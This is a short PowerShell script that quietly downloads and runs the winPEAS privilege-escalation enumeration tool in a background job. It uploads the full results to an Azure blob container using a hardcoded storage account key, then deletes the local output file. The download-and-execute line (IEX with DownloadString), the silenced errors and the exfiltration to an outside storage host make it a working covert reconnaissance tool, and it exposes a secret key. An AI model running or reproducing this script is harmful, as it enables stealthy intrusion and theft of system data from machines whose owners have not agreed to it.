$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

Start-Job -ScriptBlock {
    $ErrorActionPreference = 'SilentlyContinue'
    $ProgressPreference = 'SilentlyContinue'
    
    $storageAccount = 'winpeas'
    $storageKey = 'Zd4FQs7oaaYqviaOEBdcvcE/CDp43O23jFgPPmMGGaO90iEHWxc52Rn2jGMqprFPURq6aQRzRDBk+AStOURkAg=='
    $container = 'winpeas-results'
    $timestamp = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
    $filename = "winpeas_$timestamp.txt"
    $outputFile = "$env:temp\$filename"
    
    IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/refs/heads/master/winPEAS/winPEASps1/winPEAS.ps1')
    Invoke-WinPEAS -FullCheck | Out-File -FilePath $outputFile -Encoding UTF8
    
    $date = [DateTime]::UtcNow.ToString('R')
    $version = '2020-08-04'
    $resource = "/$storageAccount/$container/$filename"
    $contentLength = (Get-Item $outputFile).Length
    $stringToSign = "PUT`n`n`n$contentLength`n`ntext/plain`n`n`n`n`n`n`nx-ms-blob-type:BlockBlob`nx-ms-date:$date`nx-ms-version:$version`n$resource"
    
    $hmacsha = New-Object System.Security.Cryptography.HMACSHA256
    $hmacsha.Key = [Convert]::FromBase64String($storageKey)
    $signature = [Convert]::ToBase64String($hmacsha.ComputeHash([Text.Encoding]::UTF8.GetBytes($stringToSign)))
    
    $headers = @{
        'x-ms-date' = $date
        'x-ms-version' = $version
        'x-ms-blob-type' = 'BlockBlob'
        'Authorization' = "SharedKey $storageAccount`:$signature"
        'Content-Type' = 'text/plain'
    }
    
    $uri = "https://$storageAccount.blob.core.windows.net/$container/$filename"
    
    try {
        Invoke-RestMethod -Uri $uri -Method Put -Headers $headers -InFile $outputFile
    } catch {}
    
    Remove-Item $outputFile -Force -ErrorAction SilentlyContinue
} | Out-Null
